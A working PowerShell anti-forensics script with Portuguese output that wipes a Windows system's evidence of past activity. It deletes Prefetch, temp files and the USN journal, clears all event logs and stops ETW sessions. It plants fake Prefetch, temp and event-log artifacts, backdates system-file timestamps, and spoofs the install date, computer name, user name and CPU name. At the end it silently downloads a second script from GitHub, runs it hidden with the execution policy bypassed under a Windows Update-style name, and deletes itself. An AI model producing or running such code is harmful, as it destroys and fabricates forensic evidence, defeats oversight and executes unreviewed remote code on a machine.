#requires -RunAsAdministrator
$Host.UI.RawUI.WindowTitle = "W h y"
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White"
Clear-Host

function Pause-Script {
    Write-Host "`nFinalizado. Pressione para sair..." -ForegroundColor White
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Remove-FilesFrom {
    param([string]$Path)
    if (Test-Path $Path) {
        try {
            Get-ChildItem -Path $Path -Recurse -Force -ErrorAction SilentlyContinue | 
                Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
            Write-Host "[+] - Limpou: $Path" -ForegroundColor Green
        } catch {
            Write-Host "[!] - Erro ao limpar: $Path" -ForegroundColor Red
        }
    } else {
        Write-Host "[!] - Caminho não encontrado: $Path" -ForegroundColor Red
    }
}
Remove-FilesFrom -Path $env:TEMP
Remove-FilesFrom -Path "C:\Windows\Temp"
Remove-FilesFrom -Path "C:\Windows\Prefetch"
Remove-FilesFrom -Path "C:\ProgramData\Microsoft\Network\Downloader"
Clear-Host

$regKeys = @(
    "HKEY_CURRENT_USER\Software\WinRAR\ArcHistory",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePid1MRU",
    "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRULegacy",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceClasses\{53f56307-b6bf-11d0-94f2-00a0c91efb8b}",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_USERS\.DEFAULT\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU",
    "HKEY_CURRENT_USER\Software\WinRAR\DialogEditHistory\ExtrPath",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\UFH\SHC",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll",
    "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory",
    "HKEY_CURRENT_USER\SOFTWARE\AMD\HKIDs",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RADAR\HeapLeakDetection\DiagnosedApplications",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3134ef9c-6b18-4996-ad04-ed5912e00eb5}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3134ef9c-6b18-4996-ad04-ed5912e00eb5}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System"
)

$programs = @(
    "CHROME", "MULTITHEFTAUTO", "FIREFOX", "EDGE", "BRAVE", "OPERA", "DISCORD", "SPOTIFY", "STEAM", "EPICGAMES", "BATTLE.NET",
    "ADOBEPHOTOSHOP", "ADOBEILLUSTRATOR", "ADOBEAFTEREFFECTS", "ADOBEPREMIERE", "PAINTNET", "PAINT",
    "NOTEPAD", "NOTEPAD++", "VSCODE", "SUBLIMETEXT", "PYCHARM", "INTELLIJ", "ANDROIDSTUDIO", "VMWARE",
    "VIRTUALBOX", "PUTTY", "WINSCP", "7ZIP", "WINRAR", "EASYBCD", "XMOUSEBUTTONS", "MSWORD", "MSEXCEL",
    "MSPOWERPOINT", "ONENOTE", "OUTLOOK", "THUNDERBIRD", "CALC", "KODI", "VLC", "BLUESTACKS", "LDPLAYER",
    "NVIDIA", "AMDRADEON", "REALTEK", "AUDACITY", "OBS", "XBOXAPP", "GAMEBAR", "NETFLIX", "YOUTUBEMUSIC",
    "GOOGLEDRIVE", "ONEDRIVE", "DROPBOX", "TEAMS", "SKYPE", "ZOOM", "TERRARIA", "MINECRAFT", "ROBLOX",
    "VALORANT", "CS2", "FORTNITE", "LOL", "DOTA2", "WARFRAME", "AMAZON", "EBAY", "ALIPAY", "WECHAT",
    "WHATSAPP", "MESSENGER", "GITHUB", "GIT", "POSTMAN", "SQLITE", "MYSQLWORKBENCH", "HEIDISQL", "DOCKER",
    "KUBERNETES", "ANSIBLE", "FILEZILLA", "TOR", "TEAMVIEWER", "ANYDESK", "PSEXEC", "RSAT", "NMAP",
    "WIRESHARK", "FDM", "IDM", "ACROBAT", "WINDOWSDEFENDER", "WINDOWSUPDATE", "TASKMANAGER",
    "SYSTEM", "CMD", "POWERSHELL", "REGEDIT", "WINDOWSINSTALLER", "CCLEANER", "DEFRAG", "MSPAINT",
    "WORDPAD", "CALENDAR", "MAIL", "PHOTOS", "CAMERA", "ALARMS", "CALCULATOR", "CONNECT", "CONTACT",
    "MONEY", "NEWS", "SPORTS", "WEATHER", "STORE", "MUSIC", "VIDEO", "MOVIE", "TV", "PHONE", "MESSAGES"
)

$baseDir = "C:\Program Files\ProgramSystem"
$createdDirs = @()
Write-Host "Verificando/Criando diretórios..." -ForegroundColor Green
foreach ($program in $programs) {
    $dirPath = Join-Path -Path $baseDir -ChildPath $program
    
    if (-not (Test-Path -Path $dirPath)) {
        try {
            $null = New-Item -Path $dirPath -ItemType Directory -Force
            $createdDirs += $dirPath
            Write-Host "[+] - Criado: $dirPath" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Falha ao criar $dirPath : $_" -ForegroundColor Red
        }
    }
    else {
        Write-Host "[-] Diretório já existe: $dirPath" -ForegroundColor Green
    }
}

Write-Host "`nSimulando execução de programas..." -ForegroundColor Green
foreach ($dir in $createdDirs) {
    try {
        $logFile = Join-Path -Path $dir -ChildPath "execution.log"
        $fakeExe = Join-Path -Path $dir -ChildPath "$([System.IO.Path]::GetFileName($dir)).exe"
        
        $logContent = @"
Program: $([System.IO.Path]::GetFileName($dir))
Executed: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
PID: $(Get-Random -Minimum 1000 -Maximum 9999)
SessionID: $([System.Diagnostics.Process]::GetCurrentProcess().SessionId)
"@
        Set-Content -Path $logFile -Value $logContent
        
        $null = New-Item -Path $fakeExe -ItemType File -Force
        (Get-Item $fakeExe).LastWriteTime = (Get-Date).AddHours(-1)
        
        Write-Host "[+] - Simulado: $([System.IO.Path]::GetFileName($dir))" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] - Falha ao simular execução em $dir : $_" -ForegroundColor Red
    }
}

Write-Host "`nIniciando auto-limpeza..." -ForegroundColor Green
foreach ($dir in $createdDirs) {
    try {
        if (Test-Path -Path $dir) {
            Remove-Item -Path $dir -Recurse -Force
            Write-Host "[+] - Limpo: $dir" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] - Falha ao limpar $dir : $_" -ForegroundColor Red
        
        try {
            Start-Sleep -Seconds 1
            Remove-Item -Path $dir -Recurse -Force -ErrorAction Stop
            Write-Host "[+] - Limpeza alternativa bem-sucedida: $dir" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Não foi possível limpar $dir - Limpe manualmente" -ForegroundColor Red
        }
    }
}

# 4. Limpar logs do sistema
Write-Host "`nLimpando logs do sistema..." -ForegroundColor Green
try {
    wevtutil cl "Application" | Out-Null
    wevtutil cl "System" | Out-Null
    Write-Host "[+] - Logs do sistema limpos" -ForegroundColor Green
}
catch {
    Write-Host "[!] - Não foi possível limpar todos os logs: $_" -ForegroundColor Red
}
Clear-Host
Write-Host "[+] - Processo concluído!" -ForegroundColor Green
Write-Host "[+] - Diretórios criados e removidos: $($createdDirs.Count)" -ForegroundColor Green

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    if (Test-Path $FilePath) {
        try {
            $item = Get-Item $FilePath
            $item.CreationTime = $NewTime
            $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
            $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
        }
        catch {
            Write-Host "[!] Error modifying timestamps for $FilePath : $_" -ForegroundColor Red
			Clear-Host
        }
    }
}
Write-Host "`n[FASE 1] Manipulação do registro..." -ForegroundColor Green
Clear-Host

# 2. Clean USN Journal
try {
    fsutil usn deletejournal /D C: | Out-Null
    Write-Host "[+] - USN Journal Limpo" -ForegroundColor Green
} catch {
    Write-Host "[!] - Error Limpeza USN Journal: $_" -ForegroundColor Red
}
Clear-Host

# 3. Clean Event Logs
$logs = wevtutil el
foreach ($log in $logs) {
    try { 
        wevtutil cl "$log" | Out-Null
        Write-Host "[+] - Limpando log: $log" -ForegroundColor Green
    } 
    catch {
        Write-Host "[!] Error Limpeza log $log : $_" -ForegroundColor Red
    }
}

Clear-Host

# 4. Clean and create fake Prefetch
$prefetchPath = "$env:SystemRoot\Prefetch"
if (Test-Path $prefetchPath) {
    try {
        Remove-Item "$prefetchPath\*" -Force -Recurse -ErrorAction SilentlyContinue
        Write-Host "[+] - Prefetch Limpo!" -ForegroundColor Green
        
        $prefetchCount = Get-Random -Minimum 50 -Maximum 150
        foreach ($prog in $programs | Get-Random -Count $prefetchCount) {
            $file = "$prefetchPath\$prog-$(Get-Random -Minimum 10000000 -Maximum 99999999).pf"
            $size = Get-Random -Minimum 524288 -Maximum 3145728
            $data = New-Object byte[] $size
            (New-Object Random).NextBytes($data)
            [IO.File]::WriteAllBytes($file, $data)
            
            $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 90))
            Set-FileTime -FilePath $file -NewTime $fileTime
        }
        Write-Host "[+] - Criando $prefetchCount Falsos Log" -ForegroundColor Green
    } 
    catch {
        Write-Host "[!] - Error Prefetch: $_" -ForegroundColor Red
    }
}


$tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp")

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    if (Test-Path $FilePath) {
        $item = Get-Item $FilePath
        $item.CreationTime = $NewTime
        $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
        $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
    }
}

foreach ($temp in $tempPaths) {
    if (-not (Test-Path $temp)) {
        New-Item -Path $temp -ItemType Directory -Force | Out-Null
    }

    foreach ($prog in ($programs | Get-Random -Count 152)) {
        $fileType = Get-Random -InputObject @(".tmp", ".log", ".cache", ".dat")
        $fileName = "$prog$(Get-Random -Minimum 1000 -Maximum 9999)$fileType"
        $filePath = Join-Path $temp $fileName
        
        $size = Get-Random -Minimum 10240 -Maximum 1048576 # 10KB-1MB
        $data = New-Object byte[] $size
        (New-Object Random).NextBytes($data)
        [IO.File]::WriteAllBytes($filePath, $data)
        
        $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
        Set-FileTime -FilePath $filePath -NewTime $fileTime
        
        Write-Host "[+] - Criando Falso Temp Files: $filePath" -ForegroundColor Green
    }
}

Write-Host "`n[+] - Geração de arquivos temporários falsos concluída!" -ForegroundColor Cyan
Clear-Host
Write-Host "`n[FASE 3] Criando artefatos falsos..." -ForegroundColor Green


# 5. Create fake temp files 
$tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp", "$env:USERPROFILE\AppData\Local\Temp")
foreach ($temp in $tempPaths) {
    if (Test-Path $temp) {
        try {
            $tempFileCount = Get-Random -Minimum 30 -Maximum 100
            foreach ($prog in $programs | Get-Random -Count $tempFileCount) {
                $fileType = Get-Random -InputObject @(".tmp", ".log", ".cache", ".bak", ".dat", ".dmp", ".old", ".temp")
                $fileName = "$prog$(Get-Random -Minimum 1000 -Maximum 9999)$fileType"
                $filePath = Join-Path $temp $fileName
                
                $size = Get-Random -Minimum 10240 -Maximum 1048576
                $data = New-Object byte[] $size
                (New-Object Random).NextBytes($data)
                [IO.File]::WriteAllBytes($filePath, $data)
                
                # Set realistic timestamps
                $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
                Set-FileTime -FilePath $filePath -NewTime $fileTime
            }
            Write-Host "[+] - Criando $tempFileCount Falso temp file no $temp" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Error de criacao no temp $temp : $_" -ForegroundColor Red
        }
    }
}

# 6. Create fake program execution artifacts
$executionArtifacts = @(
    "$env:APPDATA\Microsoft\Windows\Recent",
    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations",
    "$env:LOCALAPPDATA\Microsoft\Windows\History",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
    "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles"
)

foreach ($path in $executionArtifacts) {
    if (Test-Path $path) {
        try {
            $artifactCount = Get-Random -Minimum 5 -Maximum 20
            foreach ($prog in $programs | Get-Random -Count $artifactCount) {
                $fileType = Get-Random -InputObject @(".automaticDestinations-ms", ".customDestinations-ms", ".dat", ".log", ".db", ".cache")
                $fileName = "$(Get-Random -Minimum 10000000 -Maximum 99999999)$fileType"
                $filePath = Join-Path $path $fileName
                
                $size = Get-Random -Minimum 1024 -Maximum 1048576
                $data = New-Object byte[] $size
                (New-Object Random).NextBytes($data)
                [IO.File]::WriteAllBytes($filePath, $data)
                $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 60))
                Set-FileTime -FilePath $filePath -NewTime $fileTime
            }
            Write-Host "[+] - Criação de Artefatos em $path" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Error de criação de artefatos em $path : $_" -ForegroundColor Red
        }
    }
}
Clear-Host
Write-Host "`n[FASE 4] Gerando eventos falsos..." -ForegroundColor Green

#7 Fake Event
function nonEvent {
    param (
        [string]$Program,
        [string]$Message,
        [string]$LogType = "Application"
    )

    $eventId = Get-Random -Minimum 1000 -Maximum 9999
    $source = "$Program $(Get-Random -InputObject @('Service','Provider','Manager','Host','Daemon')) $(Get-Date -Format HHmmssfff)"
    $msg = "$Message`n`nProcess ID: $(Get-Random -Minimum 1000 -Maximum 9999)`nThread ID: $(Get-Random -Minimum 1000 -Maximum 9999)`nUser: $env:USERNAME`nComputer: $env:COMPUTERNAME"

    try {
        New-EventLog -LogName $LogType -Source $source -ErrorAction SilentlyContinue
        Write-EventLog -LogName $LogType -Source $source -EntryType Information -EventId $eventId -Message $msg
        Write-Host "[+] - Criação de Evento em $LogType : $source" -ForegroundColor Green
    }
    catch {
        #Write-Host "[!] - Error creating event: $_" -ForegroundColor Red
    }
}

$eventMessages = @(
    "Application started successfully",
    "Update completed successfully",
    "Connection established to server",
    "Recoverable error detected",
    "Process terminated normally",
    "Plugin loaded successfully",
    "Backup completed",
    "Automatic verification completed",
    "Service failed to start",
    "Program requires update",
    "Connection error",
    "Architecture error detected",
    "Windows processes started with errors",
    "System failed starting svchost",
    "Update successful",
    "Search bar needs update",
    "License verification completed",
    "User authentication successful",
    "Data synchronization completed",
    "Cache cleared",
    "Configuration saved",
    "New version available",
    "Security scan completed",
    "Firewall rule applied",
    "Driver loaded successfully",
    "Network connection lost",
    "Reconnecting to service...",
    "Initialization complete",
    "Session started",
    "Session ended",
    "Data validation failed",
    "Retrying operation...",
    "Operation timed out",
    "Resource allocation failed",
    "Memory optimization completed",
    "Disk cleanup initiated"
)

$eventLogTypes = @("Application", "System")

foreach ($i in 1..150) {
    $program = $programs | Get-Random
    $logType = $eventLogTypes | Get-Random
    $message = $eventMessages | Get-Random
    nonEvent -Program $program -Message $message -LogType $logType
}
Clear-Host
Write-Host "`n[+] - Falso Eventos Log Finalizado!" -ForegroundColor Green
Clear-Host

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    
    if (Test-Path $FilePath) {
        try {
            takeown /f $FilePath /a | Out-Null
            icacls $FilePath /grant Administrators:F /t /c /q | Out-Null
            
            $item = Get-Item $FilePath
            $item.CreationTime = $NewTime
            $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
            $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
            return $true
        }
        catch {
            Write-Host "[!] Não foi possível modificar timestamps para $FilePath : $_" -ForegroundColor Red
            return $false
        }
    }
    return $false
}

# 8. Reiniciar o Explorer de forma segura
try {
    Clear-Host
    Write-Host "[+] - Reiniciando processo Explorer..." -ForegroundColor Green
    $explorerProcesses = Get-Process -Name explorer -ErrorAction SilentlyContinue
    if ($explorerProcesses) {
        $explorerProcesses | Stop-Process -Force
        Start-Sleep -Seconds 3
    }
    Start-Process "explorer.exe"
    Write-Host "[+] - Explorer reiniciado com sucesso!" -ForegroundColor Green
} catch {
    Write-Host "[!] - Falha ao reiniciar o Explorer: $_" -ForegroundColor Red
}
function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    try {
        [System.IO.File]::SetCreationTime($FilePath, $NewTime)
        [System.IO.File]::SetLastWriteTime($FilePath, $NewTime)
        [System.IO.File]::SetLastAccessTime($FilePath, $NewTime)
        return $true
    } catch {
        return $false
    }
}

# 9 Lista de arquivos do sistema para modificar
$systemFiles = @(
    "$env:WINDIR\explorer.exe",
    "$env:WINDIR\System32\cmd.exe"
)

Write-Host "`nModificando timestamps de arquivos do sistema..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 500
Clear-Host

foreach ($file in $systemFiles) {
    if (Test-Path $file) {
        $fileTime = (Get-Date).AddDays(- (Get-Random -Minimum 1 -Maximum 30))
        $success = Set-FileTime -FilePath $file -NewTime $fileTime
        
        if ($success) {
            Write-Host "[+] - Timestamps modificados para $file" -ForegroundColor Green
        } else {
            Write-Host "[!] -  Não foi possível modificar $file" -ForegroundColor Red
        }
    } else {
        Write-Host "[!] - Arquivo não encontrado: $file" -ForegroundColor Red
    }
}

# 10. Limpar sessões ETW
try {
    Clear-Host
    Write-Host "`nLimpando sessões ETW..." -ForegroundColor Cyan
    logman stop -ets | Out-Null
    logman delete -ets | Out-Null
    Write-Host "[+] - Sessões ETW paradas e removidas com sucesso" -ForegroundColor Green
} catch {
    Write-Host "[!] - Falha ao limpar sessões ETW: $_" -ForegroundColor Red
}

# Change Date Install ( Formating Sys )
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$newInstallDate = 1742761079
if (Test-Path $regPath) {
    try {
        Set-ItemProperty -Path $regPath -Name "InstallDate" -Value $newInstallDate -Type DWord
        Write-Host "[+] -  InstallDate alterado com sucesso para $newInstallDate (23/03/2025 21:17:59)" -ForegroundColor Green
    } catch {
        Write-Error "[!] - Erro ao alterar InstallDate: $_" -ForegroundColor Red
    }
} else {
    Write-Error "[!] - Chave de Registro não encontrada: $regPath" -ForegroundColor Red
}
Clear-Host

# 11 Change Inforamções 
$newnm = "Maad"
$newworkg = "MaadGroup"
$newdc = "Sistema personalizado por Maad"
$fakename = "Intel Quantum 9999X Turbo Maad Edition"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newdc -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newworkg -Force
wmic computersystem set manufacturer="$newnm"
wmic computersystem where caption='%COMPUTERNAME%' set manufacturer="$newnm"
Rename-Computer -NewName $newnm -Force -ErrorAction SilentlyContinue
$CurrentUsername = $env:USERNAME
Rename-LocalUser -Name $CurrentUsername -NewName $newnm
$cpuKey = "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0"
Set-ItemProperty -Path $cpuKey -Name "ProcessorNameString" -Value $fakename
Write-Output "Processador falsificado com sucesso: $fakename"

# Final completion message
Clear-Host
Write-Host "`n==================================" -ForegroundColor White
Write-Host "`Limpeza de Registro Ok!" -ForegroundColor Green
Write-Host "`Limpeza de Eventos Ok!" -ForegroundColor Green
Write-Host "`Limpeza de Journal Ok!" -ForegroundColor Green
Write-Host "`Fake de Registro Ok!" -ForegroundColor Green
Write-Host "`Fake de Event Ok!" -ForegroundColor Green
Write-Host "`Fake de Log | Prefetch | Temp Ok!" -ForegroundColor Green
Write-Host "`Fake Execuçao de Programas Ok!" -ForegroundColor Green
Write-Host "`n==================================" -ForegroundColor White
Write-Host "`Finalizado com sucesso!" -ForegroundColor White
Write-Host "`n==================================" -ForegroundColor White

# Versão melhorada do script de download e execução
Clear-Host
$ErrorActionPreference = 'Stop'
$destDir = "C:\Windows\Temp\WindowsUpdate"
$scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd_HHmmss').ps1"  # Adicionei hora/minuto/segundo para evitar conflitos
$scriptPath = Join-Path -Path $destDir -ChildPath $scriptName
$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"
$logFile = Join-Path -Path $destDir -ChildPath "Downloader_$(Get-Date -Format 'yyyyMMdd').log"
function Write-Log {
    param (
        [string]$message,
        [string]$type = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$type] $message"
    try {
        Add-Content -Path $logFile -Value $logEntry -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Falha ao escrever no log: $_"
    }
}

try {
    if (-not (Test-Path $destDir)) {
        New-Item -Path $destDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        Write-Log "Diretório criado: $destDir"
    }
    Write-Log "Iniciando download do script de $downloadUrl"
    $progressPreference = 'silentlyContinue'  # Oculta a barra de progresso
    Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath -ErrorAction Stop
    $progressPreference = 'Continue'
    
    if (Test-Path $scriptPath) {
        Write-Log "Script baixado com sucesso para $scriptPath"
        if ((Get-Item $scriptPath).Length -eq 0) {
            throw "Arquivo baixado está vazio"
        }

        Write-Log "Iniciando execução do script"
        $process = Start-Process powershell.exe -ArgumentList @(
            "-NoLogo",
            "-ExecutionPolicy Bypass",
            "-NoProfile",
            "-File `"$scriptPath`""
        ) -PassThru -WindowStyle Hidden

        $selfPath = $MyInvocation.MyCommand.Definition
        if (-not [string]::IsNullOrEmpty($selfPath) -and (Test-Path $selfPath)) {
            Write-Log "Agendando auto-exclusão deste script"
            Start-Process powershell.exe -ArgumentList @(
                "-NoLogo",
                "-NoProfile",
                "-Command",
                "Start-Sleep -Seconds 5;",
                "try { Remove-Item -Path '$selfPath' -Force -ErrorAction Stop }",
                "catch { Write-Output 'Falha na auto-exclusão: $_' | Out-File '$logFile' -Append }"
            ) -WindowStyle Hidden
        }
        
        Write-Log "Operação concluída com sucesso"
        exit 0
    } else {
        throw "Falha ao baixar o script - arquivo não encontrado após download"
    }
}
catch {
    $errorMsg = "ERRO: $($_.Exception.Message)"
    Write-Host $errorMsg -ForegroundColor Red
    Write-Log $errorMsg -type "ERROR"
    exit 1
}
Pause-Script
